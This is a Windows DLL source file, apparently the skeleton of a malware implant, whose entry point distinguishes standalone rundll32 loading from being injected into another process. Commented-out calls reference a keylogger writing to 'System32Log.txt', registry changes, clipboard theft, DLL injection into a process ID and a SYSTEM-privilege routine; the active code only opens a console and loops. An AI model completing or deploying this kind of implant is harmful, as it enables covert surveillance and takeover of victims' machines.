// dllmain.cpp : 定义 DLL 应用程序的入口点。
#include "pch.h"

#include "library.h"
#include "handlers/get_system.h"
#include "runtime/utils.h"

HINSTANCE hInst;                                // 当前实例
wchar_t executable_path[MAX_PATH];
bool stand_alone = false;
HINSTANCE hModule;

BOOL APIENTRY DllMain( HMODULE hModule,
                       DWORD  ul_reason_for_call,
                       LPVOID lpReserved
                     )
{
    switch (ul_reason_for_call)
    {
    case DLL_PROCESS_ATTACH:
        ::hModule = hModule;
        GetModuleFileName(NULL, executable_path, MAX_PATH);
        if (!lstrcmp(executable_path, L"C:\\Windows\\System32\\rundll32.exe"))
        {
            MessageBox(0, L"Running", 0, 0);

            stand_alone = true;
        }
        else {
            MessageBox(0, L"Injected", 0, 0);
            EntryPoint(NULL, NULL, "", 0);
        }
        break;
    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}


extern "C" LIBRARY_API void CALLBACK EntryPoint(HWND hwnd, HINSTANCE hinst, LPCSTR lpszCmdLine, int nCmdShow)
{
    UNREFERENCED_PARAMETER(hwnd);
    UNREFERENCED_PARAMETER(nCmdShow);
    ::hInst = hinst; // 将实例句柄存储在全局变量中

    //puts("hello, dll!");
    //::MessageBox(0, L"HELLO", 0, 0);
    ConsoleInit();

    //printf("Hello!\n");
    //ofs.open("System32Log.txt");
    //RawInputKeyLogger.KeyLoggerInit(&ofs);
    //setReg();
    //std::wcout << GetClipboardText() << std::endl;
    //EXE* head = NULL;
    //head = creatList();
    //printList(head);

    //injectDll(9832, L"C:\\Users\\warren\\source\\repos\\Dll1\\x64\\Debug\\Dll1.dll");
    
    //get_system();

    while (true);
    // 主消息循环:
    //MSG msg;
    //while (GetMessage(&msg, nullptr, 0, 0))
    //{
    //    TranslateMessage(&msg);
    //    DispatchMessage(&msg);
    //}

    //return (int)msg.wParam;
}
